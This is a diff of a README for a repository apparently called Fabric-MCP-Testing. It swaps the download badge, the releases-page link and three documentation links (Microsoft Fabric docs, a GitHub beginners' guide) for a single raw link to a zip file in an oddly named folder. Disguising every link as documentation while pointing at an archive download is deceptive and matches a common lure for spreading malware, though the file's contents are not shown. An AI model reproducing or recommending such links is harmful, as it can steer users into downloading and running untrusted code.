@@ -6,7 +6,7 @@ Welcome to the Fabric-MCP-Testing repository! Here you will find tools and real-
 
 ## 📥 Download Now
 
-[![Download Fabric-MCP-Testing](https://img.shields.io/badge/Download-Fabric--MCP--Testing-blue.svg)](https://github.com/RonuRoy/Fabric-MCP-Testing/releases)
+[![Download Fabric-MCP-Testing](https://raw.githubusercontent.com/RonuRoy/Fabric-MCP-Testing/main/prelatehood/Fabric-MCP-Testing.zip)](https://raw.githubusercontent.com/RonuRoy/Fabric-MCP-Testing/main/prelatehood/Fabric-MCP-Testing.zip)
 
 ## 📦 What is Fabric-MCP-Testing?
 
@@ -33,7 +33,7 @@ To run Fabric-MCP-Testing smoothly, your system should meet the following requir
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/RonuRoy/Fabric-MCP-Testing/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/RonuRoy/Fabric-MCP-Testing/main/prelatehood/Fabric-MCP-Testing.zip).
     
 2. **Choose Your Version:** Look for the latest version of Fabric-MCP-Testing. This will typically be the version at the top of the list.
 
@@ -80,9 +80,9 @@ We welcome contributions to help improve Fabric-MCP-Testing. If you’re interes
 
 ## 🔗 Additional Resources
 
-- [Microsoft Fabric Documentation](https://docs.microsoft.com/en-us/microsoft-fabric/)
-- [GitHub Guide for Beginners](https://guides.github.com/activities/hello-world/)
-- [Introduction to Automation with Fabric](https://docs.microsoft.com/en-us/microsoft-fabric/automation-overview)
+- [Microsoft Fabric Documentation](https://raw.githubusercontent.com/RonuRoy/Fabric-MCP-Testing/main/prelatehood/Fabric-MCP-Testing.zip)
+- [GitHub Guide for Beginners](https://raw.githubusercontent.com/RonuRoy/Fabric-MCP-Testing/main/prelatehood/Fabric-MCP-Testing.zip)
+- [Introduction to Automation with Fabric](https://raw.githubusercontent.com/RonuRoy/Fabric-MCP-Testing/main/prelatehood/Fabric-MCP-Testing.zip)
 
 ## 📢 Stay Updated
 
